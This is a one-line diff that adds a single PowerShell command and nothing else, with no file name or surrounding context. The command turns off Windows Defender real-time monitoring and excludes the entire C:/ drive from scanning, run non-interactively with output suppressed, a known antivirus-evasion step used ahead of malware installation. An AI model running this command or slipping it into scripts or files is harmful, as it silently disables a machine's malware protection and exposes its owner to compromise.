@@ -1,0 +1,1 @@
+powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true; powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath C:/
